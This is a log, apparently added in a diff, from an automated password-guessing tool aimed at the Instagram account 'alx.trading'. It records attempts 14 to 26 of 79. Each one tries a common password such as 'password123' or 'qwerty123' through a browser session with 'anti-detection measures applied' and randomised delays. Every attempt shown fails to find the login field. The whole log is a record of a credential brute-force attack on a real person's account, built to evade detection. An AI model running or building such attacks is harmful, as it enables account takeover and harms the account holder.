+2025-05-25 09:00:40,624 - INFO - ✅ Browser session closed
+2025-05-25 09:00:40,624 - INFO - ✅ Virtual display stopped
+2025-05-25 09:00:40,625 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d1c87380>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/83c165b68add501c2b371c65eb97f342
+2025-05-25 09:00:40,626 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd850>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/83c165b68add501c2b371c65eb97f342
+2025-05-25 09:00:40,626 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccfd70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/83c165b68add501c2b371c65eb97f342
+2025-05-25 09:00:40,627 - INFO - ✅ Browser session closed
+2025-05-25 09:00:40,627 - INFO - ✅ Virtual display stopped
+2025-05-25 09:00:40,627 - INFO - Attempt 14/79: welcome
+2025-05-25 09:00:40,627 - INFO - Waiting 9.8s before next attempt...
+2025-05-25 09:00:50,468 - INFO - 🎯 Direct attack: alx.trading:welcome
+2025-05-25 09:00:52,470 - INFO - 🖥️ Virtual display started: :51
+2025-05-25 09:00:54,471 - INFO - 🖥️ Virtual display started: :20
+2025-05-25 09:00:54,471 - INFO - Creating chrome browser session...
+2025-05-25 09:00:54,472 - INFO - ====== WebDriver manager ======
+2025-05-25 09:00:54,542 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:00:54,552 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:00:54,562 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:00:54,936 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:00:54,936 - INFO - ✅ Browser session created successfully
+2025-05-25 09:00:54,936 - INFO - Navigating to Instagram...
+2025-05-25 09:01:00,728 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:02:00,890 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:02:00,971 - INFO - ✅ Browser session closed
+2025-05-25 09:02:00,971 - INFO - ✅ Virtual display stopped
+2025-05-25 09:02:00,972 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccca70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d985be4a21ba3e14822033c1a45c2253
+2025-05-25 09:02:00,973 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccd70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d985be4a21ba3e14822033c1a45c2253
+2025-05-25 09:02:00,973 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc4d0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d985be4a21ba3e14822033c1a45c2253
+2025-05-25 09:02:00,974 - INFO - ✅ Browser session closed
+2025-05-25 09:02:00,974 - INFO - ✅ Virtual display stopped
+2025-05-25 09:02:00,974 - INFO - Attempt 15/79: monkey
+2025-05-25 09:02:00,974 - INFO - Waiting 14.8s before next attempt...
+2025-05-25 09:02:15,730 - INFO - 🎯 Direct attack: alx.trading:monkey
+2025-05-25 09:02:17,735 - INFO - 🖥️ Virtual display started: :86
+2025-05-25 09:02:19,737 - INFO - 🖥️ Virtual display started: :50
+2025-05-25 09:02:19,737 - INFO - Creating chrome browser session...
+2025-05-25 09:02:19,737 - INFO - ====== WebDriver manager ======
+2025-05-25 09:02:19,808 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:02:19,820 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:02:19,829 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:02:20,171 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:02:20,171 - INFO - ✅ Browser session created successfully
+2025-05-25 09:02:20,171 - INFO - Navigating to Instagram...
+2025-05-25 09:02:25,503 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:03:25,704 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:03:25,785 - INFO - ✅ Browser session closed
+2025-05-25 09:03:25,786 - INFO - ✅ Virtual display stopped
+2025-05-25 09:03:25,787 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccfb00>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/3772cb217694d9b118257c55bd44b05a
+2025-05-25 09:03:25,787 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc650>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/3772cb217694d9b118257c55bd44b05a
+2025-05-25 09:03:25,788 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccd70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/3772cb217694d9b118257c55bd44b05a
+2025-05-25 09:03:25,788 - INFO - ✅ Browser session closed
+2025-05-25 09:03:25,788 - INFO - ✅ Virtual display stopped
+2025-05-25 09:03:25,788 - INFO - Attempt 16/79: password123
+2025-05-25 09:03:25,789 - INFO - Waiting 14.5s before next attempt...
+2025-05-25 09:03:40,304 - INFO - 🎯 Direct attack: alx.trading:password123
+2025-05-25 09:03:42,306 - INFO - 🖥️ Virtual display started: :50
+2025-05-25 09:03:44,307 - INFO - 🖥️ Virtual display started: :88
+2025-05-25 09:03:44,307 - INFO - Creating chrome browser session...
+2025-05-25 09:03:44,308 - INFO - ====== WebDriver manager ======
+2025-05-25 09:03:44,388 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:03:44,400 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:03:44,410 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:03:44,753 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:03:44,753 - INFO - ✅ Browser session created successfully
+2025-05-25 09:03:44,753 - INFO - Navigating to Instagram...
+2025-05-25 09:03:50,531 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:04:50,726 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:04:50,798 - INFO - ✅ Browser session closed
+2025-05-25 09:04:50,799 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc650>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f998e2040d4029abd468ef637b5b41f6
+2025-05-25 09:04:50,800 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccca40>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f998e2040d4029abd468ef637b5b41f6
+2025-05-25 09:04:50,800 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccd70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f998e2040d4029abd468ef637b5b41f6
+2025-05-25 09:04:50,801 - INFO - ✅ Browser session closed
+2025-05-25 09:04:50,801 - INFO - Attempt 17/79: admin123
+2025-05-25 09:04:50,801 - INFO - Waiting 8.2s before next attempt...
+2025-05-25 09:04:59,051 - INFO - 🎯 Direct attack: alx.trading:admin123
+2025-05-25 09:05:01,052 - INFO - 🖥️ Virtual display started: :13
+2025-05-25 09:05:03,054 - INFO - 🖥️ Virtual display started: :19
+2025-05-25 09:05:03,054 - INFO - Creating chrome browser session...
+2025-05-25 09:05:03,054 - INFO - ====== WebDriver manager ======
+2025-05-25 09:05:03,127 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:05:03,136 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:05:03,148 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:05:03,504 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:05:03,504 - INFO - ✅ Browser session created successfully
+2025-05-25 09:05:03,504 - INFO - Navigating to Instagram...
+2025-05-25 09:05:09,218 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:06:09,378 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:06:09,459 - INFO - ✅ Browser session closed
+2025-05-25 09:06:09,459 - INFO - ✅ Virtual display stopped
+2025-05-25 09:06:09,461 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc110>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d0695114964bf1881ca1efa2594630f8
+2025-05-25 09:06:09,461 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccda30>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d0695114964bf1881ca1efa2594630f8
+2025-05-25 09:06:09,462 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdf10>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/d0695114964bf1881ca1efa2594630f8
+2025-05-25 09:06:09,462 - INFO - ✅ Browser session closed
+2025-05-25 09:06:09,463 - INFO - ✅ Virtual display stopped
+2025-05-25 09:06:09,463 - INFO - Attempt 18/79: qwerty123
+2025-05-25 09:06:09,463 - INFO - Waiting 8.1s before next attempt...
+2025-05-25 09:06:17,517 - INFO - 🎯 Direct attack: alx.trading:qwerty123
+2025-05-25 09:06:19,519 - INFO - 🖥️ Virtual display started: :86
+2025-05-25 09:06:21,520 - INFO - 🖥️ Virtual display started: :75
+2025-05-25 09:06:21,520 - INFO - Creating chrome browser session...
+2025-05-25 09:06:21,520 - INFO - ====== WebDriver manager ======
+2025-05-25 09:06:21,593 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:06:21,606 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:06:21,623 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:06:22,004 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:06:22,004 - INFO - ✅ Browser session created successfully
+2025-05-25 09:06:22,004 - INFO - Navigating to Instagram...
+2025-05-25 09:06:27,038 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:07:27,210 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:07:27,289 - INFO - ✅ Browser session closed
+2025-05-25 09:07:27,289 - INFO - ✅ Virtual display stopped
+2025-05-25 09:07:27,291 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd730>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c46f6c773a53418c0486898b78431227
+2025-05-25 09:07:27,291 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc050>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c46f6c773a53418c0486898b78431227
+2025-05-25 09:07:27,292 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccd310>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c46f6c773a53418c0486898b78431227
+2025-05-25 09:07:27,292 - INFO - ✅ Browser session closed
+2025-05-25 09:07:27,293 - INFO - ✅ Virtual display stopped
+2025-05-25 09:07:27,293 - INFO - Attempt 19/79: 123qwe
+2025-05-25 09:07:27,293 - INFO - Waiting 12.5s before next attempt...
+2025-05-25 09:07:39,767 - INFO - 🎯 Direct attack: alx.trading:123qwe
+2025-05-25 09:07:41,768 - INFO - 🖥️ Virtual display started: :58
+2025-05-25 09:07:43,769 - INFO - 🖥️ Virtual display started: :28
+2025-05-25 09:07:43,770 - INFO - Creating chrome browser session...
+2025-05-25 09:07:43,770 - INFO - ====== WebDriver manager ======
+2025-05-25 09:07:43,843 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:07:43,852 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:07:43,862 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:07:44,245 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:07:44,246 - INFO - ✅ Browser session created successfully
+2025-05-25 09:07:44,246 - INFO - Navigating to Instagram...
+2025-05-25 09:07:50,400 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:08:50,543 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:08:50,622 - INFO - ✅ Browser session closed
+2025-05-25 09:08:50,622 - INFO - ✅ Virtual display stopped
+2025-05-25 09:08:50,623 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc170>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/8bfea42c6fec44f3cda315dc8f69cbb8
+2025-05-25 09:08:50,624 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc0b0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/8bfea42c6fec44f3cda315dc8f69cbb8
+2025-05-25 09:08:50,624 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccef0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/8bfea42c6fec44f3cda315dc8f69cbb8
+2025-05-25 09:08:50,625 - INFO - ✅ Browser session closed
+2025-05-25 09:08:50,625 - INFO - ✅ Virtual display stopped
+2025-05-25 09:08:50,625 - INFO - Attempt 20/79: 1q2w3e
+2025-05-25 09:08:50,625 - INFO - Waiting 8.0s before next attempt...
+2025-05-25 09:08:58,614 - INFO - 🎯 Direct attack: alx.trading:1q2w3e
+2025-05-25 09:09:00,616 - INFO - 🖥️ Virtual display started: :52
+2025-05-25 09:09:02,617 - INFO - 🖥️ Virtual display started: :87
+2025-05-25 09:09:02,617 - INFO - Creating chrome browser session...
+2025-05-25 09:09:02,618 - INFO - ====== WebDriver manager ======
+2025-05-25 09:09:02,690 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:09:02,702 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:09:02,714 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:09:03,067 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:09:03,067 - INFO - ✅ Browser session created successfully
+2025-05-25 09:09:03,067 - INFO - Navigating to Instagram...
+2025-05-25 09:09:09,265 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:10:09,436 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:10:09,512 - INFO - ✅ Browser session closed
+2025-05-25 09:10:09,512 - INFO - ✅ Virtual display stopped
+2025-05-25 09:10:09,513 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc0b0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/ff4e2301b0acd83fd8e6c7548c5e1d54
+2025-05-25 09:10:09,514 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccc50>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/ff4e2301b0acd83fd8e6c7548c5e1d54
+2025-05-25 09:10:09,514 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccce0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/ff4e2301b0acd83fd8e6c7548c5e1d54
+2025-05-25 09:10:09,515 - INFO - ✅ Browser session closed
+2025-05-25 09:10:09,516 - INFO - ✅ Virtual display stopped
+2025-05-25 09:10:09,516 - INFO - Attempt 21/79: instagram
+2025-05-25 09:10:09,516 - INFO - Waiting 13.6s before next attempt...
+2025-05-25 09:10:23,158 - INFO - 🎯 Direct attack: alx.trading:instagram
+2025-05-25 09:10:25,160 - INFO - 🖥️ Virtual display started: :47
+2025-05-25 09:10:27,161 - INFO - 🖥️ Virtual display started: :41
+2025-05-25 09:10:27,161 - INFO - Creating chrome browser session...
+2025-05-25 09:10:27,162 - INFO - ====== WebDriver manager ======
+2025-05-25 09:10:27,235 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:10:27,244 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:10:27,260 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:10:27,604 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:10:27,604 - INFO - ✅ Browser session created successfully
+2025-05-25 09:10:27,604 - INFO - Navigating to Instagram...
+2025-05-25 09:10:32,275 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:11:32,444 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:11:32,518 - INFO - ✅ Browser session closed
+2025-05-25 09:11:32,519 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d133a900>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0a0827320b32a6430bf9d018af684552
+2025-05-25 09:11:32,520 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce360>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0a0827320b32a6430bf9d018af684552
+2025-05-25 09:11:32,520 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc170>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0a0827320b32a6430bf9d018af684552
+2025-05-25 09:11:32,521 - INFO - ✅ Browser session closed
+2025-05-25 09:11:32,521 - INFO - Attempt 22/79: insta123
+2025-05-25 09:11:32,521 - INFO - Waiting 7.7s before next attempt...
+2025-05-25 09:11:40,227 - INFO - 🎯 Direct attack: alx.trading:insta123
+2025-05-25 09:11:42,228 - INFO - 🖥️ Virtual display started: :19
+2025-05-25 09:11:44,230 - INFO - 🖥️ Virtual display started: :87
+2025-05-25 09:11:44,230 - INFO - Creating chrome browser session...
+2025-05-25 09:11:44,230 - INFO - ====== WebDriver manager ======
+2025-05-25 09:11:44,303 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:11:44,314 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:11:44,324 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:11:44,677 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:11:44,678 - INFO - ✅ Browser session created successfully
+2025-05-25 09:11:44,678 - INFO - Navigating to Instagram...
+2025-05-25 09:11:50,111 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:12:50,273 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:12:50,346 - INFO - ✅ Browser session closed
+2025-05-25 09:12:50,346 - INFO - ✅ Virtual display stopped
+2025-05-25 09:12:50,348 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc860>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e13d8b6119fbc5910fed92b6f84d3278
+2025-05-25 09:12:50,348 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccda0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e13d8b6119fbc5910fed92b6f84d3278
+2025-05-25 09:12:50,349 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc5c0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e13d8b6119fbc5910fed92b6f84d3278
+2025-05-25 09:12:50,350 - INFO - ✅ Browser session closed
+2025-05-25 09:12:50,350 - INFO - ✅ Virtual display stopped
+2025-05-25 09:12:50,350 - INFO - Attempt 23/79: love123
+2025-05-25 09:12:50,350 - INFO - Waiting 8.5s before next attempt...
+2025-05-25 09:12:58,808 - INFO - 🎯 Direct attack: alx.trading:love123
+2025-05-25 09:13:00,810 - INFO - 🖥️ Virtual display started: :54
+2025-05-25 09:13:02,811 - INFO - 🖥️ Virtual display started: :85
+2025-05-25 09:13:02,812 - INFO - Creating chrome browser session...
+2025-05-25 09:13:02,812 - INFO - ====== WebDriver manager ======
+2025-05-25 09:13:02,884 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:13:02,896 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:13:02,907 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:13:03,265 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:13:03,265 - INFO - ✅ Browser session created successfully
+2025-05-25 09:13:03,265 - INFO - Navigating to Instagram...
+2025-05-25 09:13:09,530 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:14:09,719 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:14:09,798 - INFO - ✅ Browser session closed
+2025-05-25 09:14:09,798 - INFO - ✅ Virtual display stopped
+2025-05-25 09:14:09,799 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccdbe0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/eac5145adf844360f36ac7f99c093318
+2025-05-25 09:14:09,799 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc6e0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/eac5145adf844360f36ac7f99c093318
+2025-05-25 09:14:09,800 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce2d0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/eac5145adf844360f36ac7f99c093318
+2025-05-25 09:14:09,800 - INFO - ✅ Browser session closed
+2025-05-25 09:14:09,801 - INFO - ✅ Virtual display stopped
+2025-05-25 09:14:09,801 - INFO - Attempt 24/79: family
+2025-05-25 09:14:09,801 - INFO - Waiting 5.7s before next attempt...
+2025-05-25 09:14:15,502 - INFO - 🎯 Direct attack: alx.trading:family
+2025-05-25 09:14:17,504 - INFO - 🖥️ Virtual display started: :50
+2025-05-25 09:14:19,505 - INFO - 🖥️ Virtual display started: :71
+2025-05-25 09:14:19,505 - INFO - Creating chrome browser session...
+2025-05-25 09:14:19,506 - INFO - ====== WebDriver manager ======
+2025-05-25 09:14:19,579 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:14:19,592 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:14:19,604 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:14:19,957 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:14:19,958 - INFO - ✅ Browser session created successfully
+2025-05-25 09:14:19,958 - INFO - Navigating to Instagram...
+2025-05-25 09:14:23,967 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:15:24,142 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:15:24,221 - INFO - ✅ Browser session closed
+2025-05-25 09:15:24,221 - INFO - ✅ Virtual display stopped
+2025-05-25 09:15:24,222 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc6e0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0787ff307f7cbfe482b69cb68df9f35b
+2025-05-25 09:15:24,223 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc890>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0787ff307f7cbfe482b69cb68df9f35b
+2025-05-25 09:15:24,223 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce0f0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0787ff307f7cbfe482b69cb68df9f35b
+2025-05-25 09:15:24,224 - INFO - ✅ Browser session closed
+2025-05-25 09:15:24,224 - INFO - ✅ Virtual display stopped
+2025-05-25 09:15:24,224 - INFO - Attempt 25/79: friends
+2025-05-25 09:15:24,224 - INFO - Waiting 14.2s before next attempt...
+2025-05-25 09:15:38,404 - INFO - 🎯 Direct attack: alx.trading:friends
+2025-05-25 09:15:40,406 - INFO - 🖥️ Virtual display started: :60
+2025-05-25 09:15:42,407 - INFO - 🖥️ Virtual display started: :32
+2025-05-25 09:15:42,407 - INFO - Creating chrome browser session...
+2025-05-25 09:15:42,408 - INFO - ====== WebDriver manager ======
+2025-05-25 09:15:42,481 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:15:42,493 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:15:42,506 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 09:15:42,867 - INFO - ✅ Anti-detection measures applied
+2025-05-25 09:15:42,867 - INFO - ✅ Browser session created successfully
+2025-05-25 09:15:42,867 - INFO - Navigating to Instagram...
+2025-05-25 09:15:46,717 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:16:46,870 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 09:16:46,941 - INFO - ✅ Browser session closed
+2025-05-25 09:16:46,941 - INFO - ✅ Virtual display stopped
+2025-05-25 09:16:46,942 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d133a6c0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/a38f02f92570d35937cb79698941ca5c
+2025-05-25 09:16:46,942 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc680>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/a38f02f92570d35937cb79698941ca5c
+2025-05-25 09:16:46,943 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cce570>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/a38f02f92570d35937cb79698941ca5c
+2025-05-25 09:16:46,943 - INFO - ✅ Browser session closed
+2025-05-25 09:16:46,943 - INFO - ✅ Virtual display stopped
+2025-05-25 09:16:46,943 - INFO - Attempt 26/79: picture1
+2025-05-25 09:16:46,944 - INFO - Waiting 13.0s before next attempt...
+2025-05-25 09:16:59,904 - INFO - 🎯 Direct attack: alx.trading:picture1
+2025-05-25 09:17:01,905 - INFO - 🖥️ Virtual display started: :20
+2025-05-25 09:17:03,907 - INFO - 🖥️ Virtual display started: :66
+2025-05-25 09:17:03,907 - INFO - Creating chrome browser session...
+2025-05-25 09:17:03,907 - INFO - ====== WebDriver manager ======
+2025-05-25 09:17:03,979 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 09:17:03,990 - INFO - Get LATEST chromedriver version for google-chrome
